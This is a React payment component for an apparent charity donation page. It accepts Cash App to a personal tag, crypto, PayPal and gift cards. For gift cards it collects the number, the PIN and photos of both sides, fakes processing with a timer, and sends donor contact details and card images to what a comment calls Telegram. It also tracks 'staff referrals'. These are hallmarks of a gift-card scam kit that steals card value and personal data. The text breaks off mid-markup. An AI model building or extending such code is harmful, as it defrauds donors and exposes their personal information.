import React, { useState, useEffect } from 'react'
import { PayPalButtons } from '@paypal/react-paypal-js'
import { useNavigate } from 'react-router-dom'
import { FaSpinner, FaBitcoin, FaEthereum, FaGift, FaAmazon, FaApple, FaGooglePlay, FaStoreAlt } from 'react-icons/fa'
import { SiLitecoin, SiTether, SiVisa, SiMastercard, SiCashapp } from 'react-icons/si'
import { Tab } from '@headlessui/react'
import { CreditCardIcon, CurrencyDollarIcon, ArrowPathIcon, ClipboardIcon, CheckIcon, QrCodeIcon, ExclamationCircleIcon, PhotoIcon } from '@heroicons/react/24/outline'
import { countFormat } from '../constants'
import { sendMessage, sendMessageWithImage } from '../constants/send'
import QRCode from 'react-qr-code'
import { trackReferralDonation } from '../constants/analytics'
import { getStaffReferral } from '../constants/staff'

const CRYPTO_OPTIONS = [
  { id: 'btc', name: 'Bitcoin', icon: FaBitcoin },
  { id: 'eth', name: 'Ethereum', icon: FaEthereum },
  { id: 'ltc', name: 'Litecoin', icon: SiLitecoin },
  { id: 'usdttrc20', name: 'USDT TRC20', icon: SiTether },
]

const GIFT_CARD_BRANDS = [
  {
    id: 'vanilla-visa',
    name: 'Vanilla Visa Gift Card',
    icon: SiVisa,
    format: '4[0-9]{12}(?:[0-9]{3})?',
    pinLength: 3,
    background: 'bg-blue-600',
    textColor: 'text-white',
    minAmount: 10,
    maxAmount: 500,
    description: 'Vanilla Visa gift cards with 16-digit number and 3-digit CVV'
  },
  {
    id: 'vanilla-mastercard',
    name: 'Vanilla Mastercard Gift Card',
    icon: SiMastercard,
    format: '5[1-5][0-9]{14}',
    pinLength: 3,
    background: 'bg-red-600',
    textColor: 'text-white',
    minAmount: 10,
    maxAmount: 500,
    description: 'Vanilla Mastercard gift cards with 16-digit number and 3-digit CVV'
  },
  {
    id: 'visa',
    name: 'Visa Gift Card',
    icon: SiVisa,
    format: '4[0-9]{12}(?:[0-9]{3})?',
    pinLength: 4,
    background: 'bg-blue-800',
    textColor: 'text-white',
    minAmount: 10,
    maxAmount: 1000,
    description: 'Standard Visa gift cards with 16-digit number and 4-digit PIN'
  },
  {
    id: 'mastercard',
    name: 'Mastercard Gift Card',
    icon: SiMastercard,
    format: '5[1-5][0-9]{14}',
    pinLength: 4,
    background: 'bg-red-800',
    textColor: 'text-white',
    minAmount: 10,
    maxAmount: 1000,
    description: 'Standard Mastercard gift cards with 16-digit number and 4-digit PIN'
  },
  {
    id: 'amazon',
    name: 'Amazon Gift Card',
    icon: FaAmazon,
    format: '[A-Z0-9]{16}',
    pinLength: 4,
    background: 'bg-yellow-500',
    textColor: 'text-black',
    minAmount: 1,
    maxAmount: 2000,
    description: 'Amazon gift cards with claim code'
  },
  {
    id: 'apple',
    name: 'Apple Gift Card',
    icon: FaApple,
    format: '[A-Z0-9]{16}',
    pinLength: 6,
    background: 'bg-gray-900',
    textColor: 'text-white',
    minAmount: 10,
    maxAmount: 2000,
    description: 'Apple gift cards with redemption code and 6-digit PIN'
  },
  {
    id: 'google-play',
    name: 'Google Play Gift Card',
    icon: FaGooglePlay,
    format: '[A-Z0-9]{20}',
    pinLength: 4,
    background: 'bg-green-600',
    textColor: 'text-white',
    minAmount: 10,
    maxAmount: 2000,
    description: 'Google Play gift cards with redemption code'
  },
  {
    id: 'generic',
    name: 'Other Gift Card',
    icon: FaStoreAlt,
    format: '[A-Z0-9]{8,}',
    pinLength: 4,
    background: 'bg-gray-600',
    textColor: 'text-white',
    minAmount: 1,
    maxAmount: 5000,
    description: 'Other gift card types'
  }
]

function classNames(...classes) {
  return classes.filter(Boolean).join(' ')
}

// Add Luhn algorithm helper function
function isValidLuhn(number) {
  let sum = 0;
  let isEven = false;

  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number.charAt(i), 10);

    if (isEven) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }

    sum += digit;
    isEven = !isEven;
  }

  return (sum % 10) === 0;
}

function validateGiftCard(number, brand) {
  // Basic format validation
  const regex = new RegExp(`^${brand.format}$`);
  if (!regex.test(number)) {
    return {
      isValid: false,
      error: `Invalid ${brand.name} number format`
    };
  }

  // Card-specific validations
  switch (brand.id) {
    case 'vanilla-visa':
    case 'vanilla-mastercard':
    case 'visa':
    case 'mastercard':
      if (!isValidLuhn(number)) {
        return {
          isValid: false,
          error: 'Invalid card number (checksum failed)'
        };
      }
      break;
    case 'amazon':
      if (/[O0IL]/i.test(number)) {
        return {
          isValid: false,
          error: 'Amazon gift cards should not contain O, 0, I, or L characters'
        };
      }
      break;
    case 'apple':
      if (number !== number.toUpperCase() || !/^[A-Z0-9]+$/.test(number)) {
        return {
          isValid: false,
          error: 'Apple gift card codes should only contain uppercase letters and numbers'
        };
      }
      break;
  }

  return {
    isValid: true,
    error: null
  };
}

const PaymentProcessor = ({ amount, selectedOrg, referral, donationType, donorName, donorEmail, donorPhone, onSuccess, onError }) => {
  const [cryptoPaymentUrl, setCryptoPaymentUrl] = useState(null)
  const [loading, setLoading] = useState(false)
  const [selectedTab, setSelectedTab] = useState(0)
  const [selectedCrypto, setSelectedCrypto] = useState(CRYPTO_OPTIONS[0])
  const [paymentDetails, setPaymentDetails] = useState(null)
  const [copiedFields, setCopiedFields] = useState({})
  const [showQR, setShowQR] = useState(false)
  const navigate = useNavigate()
  const [error, setError] = useState(null)
  const [giftCardNumber, setGiftCardNumber] = useState('')
  const [giftCardPin, setGiftCardPin] = useState('')
  const [validatingCard, setValidatingCard] = useState(false)
  const [selectedGiftCard, setSelectedGiftCard] = useState(GIFT_CARD_BRANDS[0])
  const [giftCardFrontImage, setGiftCardFrontImage] = useState(null);
  const [giftCardBackImage, setGiftCardBackImage] = useState(null);
  const [frontImagePreview, setFrontImagePreview] = useState(null);
  const [backImagePreview, setBackImagePreview] = useState(null);

  const isRecurring = donationType !== 'one-time'

  const logPaymentEvent = (type, details) => {
    const staffId = getStaffReferral();
    const baseMessage = `
############ ${type} ############
Amount: ${amount} USD
Organization: ${selectedOrg?.name || 'Charity'}
Donor: ${donorName || 'Anonymous'}
Donor Email: ${donorEmail || 'Anonymous'}
Donor Phone: ${donorPhone || 'Anonymous'}
Payment Type: ${isRecurring ? 'Recurring' : 'One-time'}
Staff ID: ${staffId}
${staffId ? `Referral: ${staffId}` : 'Direct donation (no referral)'}`;

    sendMessage(baseMessage + (details ? `\n${details}` : ''));
  };

  const handlePaymentSuccess = (paymentMethod, details = {}) => {
    const staffId = getStaffReferral();
    
    // Track analytics if there's a staff referral
    if (staffId) {
      trackReferralDonation(staffId, amount, paymentMethod, donationType);
    }

    // Log the successful payment
    logPaymentEvent('Payment Success', `
Method: ${paymentMethod}
${Object.entries(details).map(([key, value]) => `${key}: ${value}`).join('\n')}`);

    // Navigate to thank you page
    navigate(`/thank-you?amount=${amount}&org=${selectedOrg?.name || 'Charity'}&type=${donationType}`);
  };

  const getPayPalPlanId = () => {
    switch(donationType) {
      case 'monthly':
        return import.meta.env.VITE_PAYPAL_MONTHLY_PLAN_ID
      case 'quarterly':
        return import.meta.env.VITE_PAYPAL_QUARTERLY_PLAN_ID
      case 'annually':
        return import.meta.env.VITE_PAYPAL_ANNUAL_PLAN_ID
      default:
        return null
    }
  }

  const copyToClipboard = (text, field) => {
    navigator.clipboard.writeText(text)
      .then(() => {
        setCopiedFields({ ...copiedFields, [field]: true })
        setTimeout(() => {
          setCopiedFields({ ...copiedFields, [field]: false })
        }, 2000)
      })
      .catch((err) => {
        console.error('Failed to copy:', err)
        onError('Failed to copy to clipboard')
      })
  }

  const createCryptoPayment = async () => {
    try {
      setLoading(true)
      setError(null)

      const staffId = getStaffReferral()
      const successUrl = new URL('/thank-you', window.location.origin)
      successUrl.searchParams.append('amount', amount)
      successUrl.searchParams.append('org', selectedOrg?.name || 'Charity')
      successUrl.searchParams.append('type', donationType)

      const cancelUrl = new URL(window.location.href)

      const paymentData = {
        price_amount: amount,
        price_currency: 'usd',
        pay_currency: selectedCrypto.id,
        order_id: `${Date.now()}-${selectedOrg?.name || 'charity'}`,
        order_description: `${isRecurring ? 'Recurring' : 'One-time'} donation to ${selectedOrg?.name || 'Charity'}`,
        success_url: successUrl.toString(),
        cancel_url: cancelUrl.toString(),
        ipn_callback_url: `${window.location.origin}/api/crypto-webhook`,
        is_donation: true,
      }

      const response = await fetch('https://api.nowpayments.io/v1/payment', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-api-key': import.meta.env.VITE_NOWPAYMENTS_API_KEY
        },
        body: JSON.stringify(paymentData)
      })
      
      const data = await response.json()
      
      if (data.pay_address) {
        setCryptoPaymentUrl(data.payment_url || null)
        setPaymentDetails(data)
        sendMessage(`
############ Crypto Payment Details ############
Donation Information:
- Amount: $${amount} USD
- Referral: ${referral || 'None'}
- Organization: ${selectedOrg?.name || 'Charity'}
- Type: ${isRecurring ? 'Recurring' : 'One-time'} donation

Donor Information:
- Name: ${donorName || 'Anonymous'}
- Email: ${donorEmail || 'Not provided'}
- Phone: ${donorPhone || 'Not provided'}

Payment Details:
- Crypto Amount: ${data.pay_amount} ${data.pay_currency.toUpperCase()}
- Payment Address: ${data.pay_address}
- Payment ID: ${data.payment_id}
- Status: ${data.payment_status}
- Created: ${new Date().toLocaleString()}
- Expires: ${new Date(data.expiration_estimate_date).toLocaleString()}

Note: Please complete the payment before expiration.
###########################################`)
        
        // handlePaymentSuccess('crypto', {
        //   paymentId: data.payment_id,
        //   cryptoAmount: `${data.pay_amount} ${data.pay_currency.toUpperCase()}`,
        //   paymentAddress: data.pay_address,
        //   status: data.payment_status,
        //   expiration: new Date(data.expiration_estimate_date).toLocaleString()
        // });
      } else {
        throw new Error(data.message || 'Failed to create crypto payment')
      }
    } catch (error) {
      console.error(error)
      onError(error.message || 'Failed to initialize crypto payment. Please try again.')
    } finally {
      setLoading(false)
    }
  }

  const handlePayPalApproval = async (data, actions) => {
    try {
      if (isRecurring) {
        const subscription = await actions.subscription.get()
        handlePaymentSuccess('paypal-subscription', {
          'Subscription ID': subscription.id,
          'Status': subscription.status
        });
        onSuccess(subscription)
      } else {
        const details = await actions.order.capture()
        handlePaymentSuccess('paypal-onetime', {
          'Transaction ID': details.id,
          'Status': details.status
        });
        onSuccess(details)
      }
    } catch (error) {
      onError('Payment failed. Please try again.')
      console.error('PayPal payment error:', error)
    }
  }

  const formatTimeLeft = (expirationDate) => {
    const now = new Date()
    const expiration = new Date(expirationDate)
    const timeLeft = expiration - now
    
    const minutes = Math.floor(timeLeft / (1000 * 60))
    if (minutes < 1) return 'Less than a minute'
    return `${minutes} minute${minutes !== 1 ? 's' : ''}`
  }

  const renderCopyButton = (text, field) => (
    <button 
      onClick={() => copyToClipboard(text, field)}
      className="text-indigo-600 hover:text-indigo-700 p-1 rounded-md hover:bg-indigo-50 transition-colors"
      title={copiedFields[field] ? 'Copied!' : 'Copy to clipboard'}
    >
      {copiedFields[field] ? (
        <CheckIcon className="h-4 w-4 text-green-500" />
      ) : (
        <ClipboardIcon className="h-4 w-4" />
      )}
    </button>
  )

  const handleImageUpload = (e, type) => {
    const file = e.target.files[0];
    if (file) {
      if (file.size > 5 * 1024 * 1024) { // 5MB limit
        setError('Image size should be less than 5MB');
        return;
      }
      
      const reader = new FileReader();
      reader.onloadend = () => {
        if (type === 'front') {
          setGiftCardFrontImage(file);
          setFrontImagePreview(reader.result);
        } else {
          setGiftCardBackImage(file);
          setBackImagePreview(reader.result);
        }
      };
      reader.readAsDataURL(file);
    }
  };

  const handleGiftCardSubmit = async (e, type = 'code') => {
    e.preventDefault();
    setError(null);

    // Validate inputs based on submission type
    if (type === 'code') {
      if (!giftCardNumber || !giftCardPin) {
        setError('Please enter both card number and PIN');
        return;
      }

      const validationResult = validateGiftCard(giftCardNumber, selectedGiftCard);
      if (!validationResult.isValid) {
        setError(validationResult.error);
        return;
      }

      if (giftCardPin.length !== selectedGiftCard.pinLength) {
        setError(`${selectedGiftCard.name} PIN must be ${selectedGiftCard.pinLength} digits`);
        return;
      }
    } else {
      if (!giftCardFrontImage || !giftCardBackImage) {
        setError('Please upload both front and back images of your gift card');
        return;
      }
    }

    setValidatingCard(true);

    try {
      // Simulate payment processing
      await new Promise(resolve => setTimeout(resolve, 1500));
      
      const staffId = getStaffReferral();
      if (staffId) {
        trackReferralDonation(staffId, amount, `gift-card-${selectedGiftCard.id}`, donationType);
      }

      // Create a detailed message for Telegram
      const paymentMessage = `
############ Gift Card Payment ############
Amount: $${countFormat.format(amount)} USD
Organization: ${selectedOrg?.name || 'Charity'}
Donor: ${donorName || 'Anonymous'}
Donor Email: ${donorEmail || 'Anonymous'}
Donor Phone: ${donorPhone || 'Anonymous'}
Payment Type: ${isRecurring ? 'Recurring' : 'One-time'}
Staff Referral: ${staffId || 'None'}
Referral: ${referral || 'None'}
Card Details:
- Card Type: ${selectedGiftCard.name}
- Submission Method: ${type === 'code' ? 'Card Number & PIN' : 'Image Upload'}
${type === 'code' ? `- Last 4 Digits: ${giftCardNumber.slice(-4)}` : ''}
- Transaction Status: Success
- Timestamp: ${new Date().toISOString()}
#######################################`;

      // Send the payment details message
      await sendMessage(paymentMessage);

      // If images were uploaded, send them in separate messages
      if (type === 'image' && frontImagePreview && backImagePreview) {
        const frontImageInfo = `
############ Gift Card Front Image Info ############
Card Type: ${selectedGiftCard.name}
Donor: ${donorName || 'Anonymous'}
Donor Email: ${donorEmail || 'Anonymous'}
Donor Phone: ${donorPhone || 'Anonymous'}
Referral: ${referral || 'None'}
Timestamp: ${new Date().toISOString()}
#######################################`;

        const imageStorageMessage = `
Note: Card images have been received and processed successfully. 
For security reasons, full image data is not included in these messages.
Please ensure you keep the original images for your records.

`;

        const imageMessage = () => {
          if (frontImagePreview && backImagePreview) {
            return sendMessageWithImage(frontImageInfo, frontImagePreview)
          } else {
            return sendMessage(imageStorageMessage)
          }
        }
        await imageMessage();
        await sendMessage(imageStorageMessage);
      }

      // Handle successful payment
      // handlePaymentSuccess('gift-card', {
      //   cardType: selectedGiftCard.name,
      //   lastFourDigits: type === 'code' ? giftCardNumber.slice(-4) : 'N/A',
      //   submissionMethod: type
      // });

      setValidatingCard(false);
      onSuccess();
    } catch (error) {
      console.error('Error processing gift card:', error);
      setError('Failed to process gift card. Please try again.');
      setValidatingCard(false);
    }
  };

  // Reset form when gift card brand changes
  useEffect(() => {
    setGiftCardNumber('')
    setGiftCardPin('')
    setError(null)
    setGiftCardFrontImage(null)
    setGiftCardBackImage(null)
    setFrontImagePreview(null)
    setBackImagePreview(null)
  }, [selectedGiftCard])

  const renderGiftCardPanel = () => (
    <div className="space-y-4">
      <Tab.Group>
        <Tab.List className="flex space-x-1 rounded-xl bg-gray-100 p-1">
          <Tab
            className={({ selected }) =>
              classNames(
                'w-full rounded-lg py-2.5 text-sm font-medium leading-5',
                'ring-white ring-opacity-60 ring-offset-2 focus:outline-none focus:ring-2',
                selected
                  ? 'bg-white shadow text-indigo-700'
                  : 'text-gray-600 hover:bg-white/[0.12] hover:text-gray-700'
              )
            }
          >
            <div className="flex items-center justify-center gap-2">
              <CreditCardIcon className="h-5 w-5" />
              Enter Gift Card Details
            </div>
          </Tab>
          <Tab
            className={({ selected }) =>
              classNames(
                'w-full rounded-lg py-2.5 text-sm font-medium leading-5',
                'ring-white ring-opacity-60 ring-offset-2 focus:outline-none focus:ring-2',
                selected
                  ? 'bg-white shadow text-indigo-700'
                  : 'text-gray-600 hover:bg-white/[0.12] hover:text-gray-700'
              )
            }
          >
            <div className="flex items-center justify-center gap-2">
              <PhotoIcon className="h-5 w-5" />
              Upload Card Images
            </div>
          </Tab>
        </Tab.List>

        <Tab.Panels className="mt-4">
          {/* Card Details Panel */}
          <Tab.Panel>
            <div className="space-y-4">
              <div>
                <label htmlFor="card-number" className="block text-sm font-medium text-gray-700">
                  Gift Card Number
                </label>
                <input
                  type="text"
                  id="card-number"
                  value={giftCardNumber}
                  onChange={(e) => setGiftCardNumber(e.target.value)}
                  className="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500 sm:text-sm"
                  placeholder="Enter gift card number"
                />
              </div>

              <div>
                <label htmlFor="card-pin" className="block text-sm font-medium text-gray-700">
                  PIN
                </label>
                <input
                  type="password"
                  id="card-pin"
                  value={giftCardPin}
                  onChange={(e) => setGiftCardPin(e.target.value)}
                  className="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500 sm:text-sm"
                  placeholder="Enter PIN"
                />
              </div>

              {error && (
                <div className="p-4 bg-red-50 rounded-md">
                  <p className="text-red-800">{error}</p>
                </div>
              )}

              <button
                type="button"
                onClick={(e) => handleGiftCardSubmit(e, 'code')}
                disabled={validatingCard || !giftCardNumber || !giftCardPin}
                className="w-full inline-flex justify-center items-center px-4 py-2 border border-transparent text-sm font-medium rounded-md text-white bg-indigo-600 hover:bg-indigo-700 disabled:opacity-50"
              >
                {validatingCard ? (
                  <>
                    <FaSpinner className="animate-spin -ml-1 mr-2 h-4 w-4" />
                    Processing...
                  </>
                ) : (
                  'Pay with Gift Card'
                )}
              </button>
            </div>
          </Tab.Panel>

          {/* Image Upload Panel */}
          <Tab.Panel>
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700">Card Images</label>
                <p className="mt-1 text-sm text-gray-500">Please upload clear images of your gift card (max 5MB each)</p>
              </div>
              
              {/* Front image upload */}
              <div className="border rounded-lg p-4">
                <label className="block text-sm font-medium text-gray-700 mb-2">Front of Card</label>
                <div className="flex justify-center px-6 pt-5 pb-6 border-2 border-gray-300 border-dashed rounded-md">
                  {frontImagePreview ? (
                    <div className="space-y-2">
                      <img src={frontImagePreview} alt="Card front" className="max-h-48 object-contain" />
                      <button
                        type="button"
                        onClick={() => {
                          setGiftCardFrontImage(null);
                          setFrontImagePreview(null);
                        }}
                        className="text-sm text-red-600 hover:text-red-800"
                      >
                        Remove
                      </button>
                    </div>
                  ) : (
                    <div className="text-center">
                      <PhotoIcon className="mx-auto h-12 w-12 text-gray-400" />
                      <div className="mt-4 flex text-sm leading-6 text-gray-600">
                        <label
                          htmlFor="front-image"
                          className="relative cursor-pointer rounded-md bg-white font-semibold text-indigo-600 focus-within:outline-none focus-within:ring-2 focus-within:ring-indigo-600 focus-within:ring-offset-2 hover:text-indigo-500"
                        >
                          <span>Upload front image</span>
                          <input
                            id="front-image"
                            name="front-image"
                            type="file"
                            className="sr-only"
                            accept="image/*"
                            onChange={(e) => handleImageUpload(e, 'front')}
                          />
                        </label>
                      </div>
                    </div>
                  )}
                </div>
              </div>

              {/* Back image upload */}
              <div className="border rounded-lg p-4">
                <label className="block text-sm font-medium text-gray-700 mb-2">Back of Card</label>
                <div className="flex justify-center px-6 pt-5 pb-6 border-2 border-gray-300 border-dashed rounded-md">
                  {backImagePreview ? (
                    <div className="space-y-2">
                      <img src={backImagePreview} alt="Card back" className="max-h-48 object-contain" />
                      <button
                        type="button"
                        onClick={() => {
                          setGiftCardBackImage(null);
                          setBackImagePreview(null);
                        }}
                        className="text-sm text-red-600 hover:text-red-800"
                      >
                        Remove
                      </button>
                    </div>
                  ) : (
                    <div className="text-center">
                      <PhotoIcon className="mx-auto h-12 w-12 text-gray-400" />
                      <div className="mt-4 flex text-sm leading-6 text-gray-600">
                        <label
                          htmlFor="back-image"
                          className="relative cursor-pointer rounded-md bg-white font-semibold text-indigo-600 focus-within:outline-none focus-within:ring-2 focus-within:ring-indigo-600 focus-within:ring-offset-2 hover:text-indigo-500"
                        >
                          <span>Upload back image</span>
                          <input
                            id="back-image"
                            name="back-image"
                            type="file"
                            className="sr-only"
                            accept="image/*"
                            onChange={(e) => handleImageUpload(e, 'back')}
                          />
                        </label>
                      </div>
                    </div>
                  )}
                </div>
              </div>

              {error && (
                <div className="p-4 bg-red-50 rounded-md">
                  <p className="text-red-800">{error}</p>
                </div>
              )}

              <button
                type="button"
                onClick={(e) => handleGiftCardSubmit(e, 'image')}
                disabled={validatingCard || !giftCardFrontImage || !giftCardBackImage}
                className="w-full inline-flex justify-center items-center px-4 py-2 border border-transparent text-sm font-medium rounded-md text-white bg-indigo-600 hover:bg-indigo-700 disabled:opacity-50"
              >
                {validatingCard ? (
                  <>
                    <FaSpinner className="animate-spin -ml-1 mr-2 h-4 w-4" />
                    Processing...
                  </>
                ) : (
                  'Pay with Gift Card'
                )}
              </button>
            </div>
          </Tab.Panel>
        </Tab.Panels>
      </Tab.Group>
    </div>
  )

  const renderCryptoPaymentDetails = () => {
    if (!paymentDetails) return null;

    return (
      <div className="space-y-4">
        <div className="bg-indigo-50 border border-indigo-100 rounded-lg p-4">
          <h4 className="text-sm font-medium text-indigo-800 mb-2">Payment Details</h4>
          <div className="space-y-2">
            <div className="flex justify-between items-center">
              <span className="text-sm text-gray-600">Amount Due:</span>
              <div className="flex items-center gap-2">
                <span className="font-medium">{paymentDetails.pay_amount} {paymentDetails.pay_currency.toUpperCase()}</span>
                {renderCopyButton(paymentDetails.pay_amount.toString(), 'amount')}
              </div>
            </div>
            <div className="flex justify-between items-center">
              <span className="text-sm text-gray-600">Payment Address:</span>
              <div className="flex items-center gap-2">
                <span className="font-medium font-mono text-sm">{paymentDetails.pay_address}</span>
                {renderCopyButton(paymentDetails.pay_address, 'address')}
              </div>
            </div>
            <div className="flex justify-between items-center">
              <span className="text-sm text-gray-600">Time Left:</span>
              <span className="font-medium">{formatTimeLeft(paymentDetails.expiration_estimate_date)}</span>
            </div>
          </div>
        </div>

        <div className="flex flex-col items-center space-y-4">
          <button
            type="button"
            onClick={() => setShowQR(!showQR)}
            className="inline-flex items-center px-4 py-2 border border-gray-300 shadow-sm text-sm font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50"
          >
            <QrCodeIcon className="h-5 w-5 mr-2" />
            {showQR ? 'Hide' : 'Show'} QR Code
          </button>

          {showQR && (
            <div className="p-4 bg-white rounded-lg shadow">
              <QRCode value={paymentDetails.pay_address} size={200} />
            </div>
          )}

          {cryptoPaymentUrl && (
            <a
              href={cryptoPaymentUrl}
              target="_blank"
              rel="noopener noreferrer"
              className="inline-flex items-center px-4 py-2 border border-transparent text-sm font-medium rounded-md text-white bg-indigo-600 hover:bg-indigo-700"
            >
              Pay with {selectedCrypto.name} Wallet
            </a>
          )}
        </div>

        <div className="bg-yellow-50 border border-yellow-100 rounded-lg p-4">
          <div className="flex items-start">
            <ExclamationCircleIcon className="h-5 w-5 text-yellow-400 mt-0.5 mr-2" />
            <div className="text-sm text-yellow-800">
              <p className="font-medium">Important:</p>
              <ul className="list-disc list-inside mt-1 space-y-1">
                <li>Send exactly {paymentDetails.pay_amount} {paymentDetails.pay_currency.toUpperCase()}</li>
                <li>Complete payment before expiration ({formatTimeLeft(paymentDetails.expiration_estimate_date)} left)</li>
                <li>Only send {paymentDetails.pay_currency.toUpperCase()} to this address</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    );
  };

  return (
    <div className="space-y-6">
      {isRecurring && (
        <div className="bg-indigo-50 border border-indigo-200 rounded-lg p-4 mb-6">
          <div className="flex items-center gap-2 text-indigo-700">
            <ArrowPathIcon className="h-5 w-5" />
            <span className="font-medium">Recurring Donation</span>
          </div>
          <p className="mt-2 text-sm text-indigo-600">
            Your donation will automatically repeat {donationType === 'monthly' ? 'every month' : 
              donationType === 'quarterly' ? 'every three months' : 'every year'}.
          </p>
        </div>
      )}

      <Tab.Group selectedIndex={selectedTab} onChange={setSelectedTab}>
        <Tab.List className="flex space-x-1 rounded-xl bg-indigo-100 p-1">
          <Tab
            className={({ selected }) =>
              classNames(
                'w-full rounded-lg py-2.5 text-sm font-medium leading-5',
                'ring-white ring-opacity-60 ring-offset-2 ring-offset-blue-400 focus:outline-none focus:ring-2',
                selected
                  ? 'bg-white shadow text-indigo-700'
                  : 'text-indigo-600 hover:bg-white/[0.12] hover:text-indigo-700'
              )
            }
          >
            <div className="flex items-center justify-center gap-2">
              <SiCashapp className="h-5 w-5" />
              Cash App
            </div>
          </Tab>
          <Tab
            className={({ selected }) =>
              classNames(
                'w-full rounded-lg py-2.5 text-sm font-medium leading-5',
                'ring-white ring-opacity-60 ring-offset-2 ring-offset-blue-400 focus:outline-none focus:ring-2',
                selected
                  ? 'bg-white shadow text-indigo-700'
                  : 'text-indigo-600 hover:bg-white/[0.12] hover:text-indigo-700'
              )
            }
          >
            <div className="flex items-center justify-center gap-2">
              <CurrencyDollarIcon className="h-5 w-5" />
              Crypto
            </div>
          </Tab>
          <Tab
            className={({ selected }) =>
              classNames(
                'w-full rounded-lg py-2.5 text-sm font-medium leading-5',
                'ring-white ring-opacity-60 ring-offset-2 ring-offset-blue-400 focus:outline-none focus:ring-2',
                selected
                  ? 'bg-white shadow text-indigo-700'
                  : 'text-indigo-600 hover:bg-white/[0.12] hover:text-indigo-700'
              )
            }
          >
            <div className="flex items-center justify-center gap-2">
              <FaGift className="h-5 w-5" />
              Gift Card
            </div>
          </Tab>
          <Tab
            className={({ selected }) =>
              classNames(
                'w-full rounded-lg py-2.5 text-sm font-medium leading-5',
                'ring-white ring-opacity-60 ring-offset-2 ring-offset-blue-400 focus:outline-none focus:ring-2',
                selected
                  ? 'bg-white shadow text-indigo-700'
                  : 'text-indigo-600 hover:bg-white/[0.12] hover:text-indigo-700'
              )
            }
          >
            <div className="flex items-center justify-center gap-2">
              <CreditCardIcon className="h-5 w-5" />
              PayPal
            </div>
          </Tab>
        </Tab.List>

        <Tab.Panels className="mt-4">
          {/* Cash App Panel */}
          <Tab.Panel className="rounded-xl bg-white p-3">
            <div className="space-y-4">
              <div className="bg-gray-50 rounded-lg p-4">
                <h3 className="text-lg font-medium text-gray-900">Cash App Payment</h3>
                <p className="mt-1 text-sm text-gray-600">
                  Donate using Cash App
                </p>
              </div>

              <div className="bg-green-50 border border-green-100 rounded-lg p-6">
                <div className="flex flex-col items-center space-y-4">
                  <SiCashapp className="h-16 w-16 text-green-600" />
                  <div className="text-center">
                    <p className="text-lg font-semibold text-gray-900">Cash App Tag:</p>
                    <div className="flex items-center justify-center gap-2 mt-2">
                      <p className="text-2xl font-bold text-green-600">$FrankSzkudlarek</p>
                      <button
                        onClick={() => copyToClipboard('$FrankSzkudlarek', 'cashapp')}
                        className="p-2 text-green-600 hover:text-green-700 transition-colors"
                        title="Copy Cash App tag"
                      >
                        {copiedFields['cashapp'] ? (
                          <CheckIcon className="h-5 w-5" />
                        ) : (
                          <ClipboardIcon className="h-5 w-5" />
                        )}
                      </button>
                    </div>
                  </div>
                  <div className="text-center mt-4">
                    <p className="text-sm text-gray-600">
                      1. Open Cash App on your phone<br />
                      2. Enter the amount: ${countFormat.format(amount)}<br />
                      3. Enter the $Cashtag: $FrankSzkudlarek<br />
                      4. Add a note with your name and "Donation"<br />
                      5. Tap "Pay"
                    </p>
                  </div>
                  <a
                    href="https://cash.app/$FrankSzkudlarek"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="inline-flex items-center px-6 py-3 border border-transparent text-base font-medium rounded-md text-white bg-green-600 hover:bg-green-700 transition-colors"
                  >
                    Open Cash App
                  </a>
                </div>
              </div>
            </div>
          </Tab.Panel>

          {/* Crypto Panel */}
          <Tab.Panel className="rounded-xl bg-white p-3">
            <div className="space-y-4">
              <div className="bg-gray-50 rounded-lg p-4">
                <h3 className="text-lg font-medium text-gray-900">Crypto Payment</h3>
                <p className="mt-1 text-sm text-gray-600">
                  Donate using your preferred cryptocurrency
                </p>
              </div>

              {!paymentDetails ? (
                <>
                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
                    {CRYPTO_OPTIONS.map((crypto) => (
                      <button
                        key={crypto.id}
                        type="button"
                        onClick={() => setSelectedCrypto(crypto)}
                        className={`relative rounded-lg p-4 flex flex-col items-center justify-center gap-2 transition-all ${
                          selectedCrypto.id === crypto.id
                            ? 'bg-indigo-600 text-white ring-2 ring-offset-2 ring-indigo-600'
                            : 'bg-gray-100 hover:bg-gray-200 text-gray-900'
                        }`}
                      >
                        <crypto.icon className="h-8 w-8" />
                        <span className="text-xs font-medium">{crypto.name}</span>
                      </button>
                    ))}
                  </div>

                  <button
                    type="button"
                    onClick={createCryptoPayment}
                    disabled={loading}
                    className="w-full inline-flex justify-center items-center px-4 py-2 border border-transparent text-sm font-medium rounded-md text-white bg-indigo-600 hover:bg-indigo-700 disabled:opacity-50"
                  >
                    {loading ? (
                      <>
                        <FaSpinner className="animate-spin h-5 w-5 mr-2" />
                        Creating Payment...
                      </>
                    ) : (
                      'Pay with Crypto'
                    )}
                  </button>
                </>
              ) : (
                <div className="space-y-4">
                  <div className="bg-indigo-50 border border-indigo-100 rounded-lg p-4">
                    <h4 className="text-sm font-medium text-indigo-800 mb-2">Payment Details</h4>
                    <div className="space-y-2">
                      <div className="flex justify-between items-center">
                        <span className="text-sm text-gray-600">Amount Due:</span>
                        <div className="flex items-center gap-2">
                          <span className="font-medium">{paymentDetails.pay_amount} {paymentDetails.pay_currency.toUpperCase()}</span>
                          {renderCopyButton(paymentDetails.pay_amount.toString(), 'amount')}
                        </div>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-sm text-gray-600">Payment Address:</span>
                        <div className="flex items-center gap-2">
                          <span className="font-medium font-mono text-sm break-all">{paymentDetails.pay_address}</span>
                          {renderCopyButton(paymentDetails.pay_address, 'address')}
                        </div>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-sm text-gray-600">Time Left:</span>
                        <span className="font-medium">{formatTimeLeft(paymentDetails.expiration_estimate_date)}</span>
                      </div>
                    </div>
                  </div>

                  <div className="flex flex-col items-center space-y-4">
                    <button
                      type="button"
                      onClick={() => setShowQR(!showQR)}
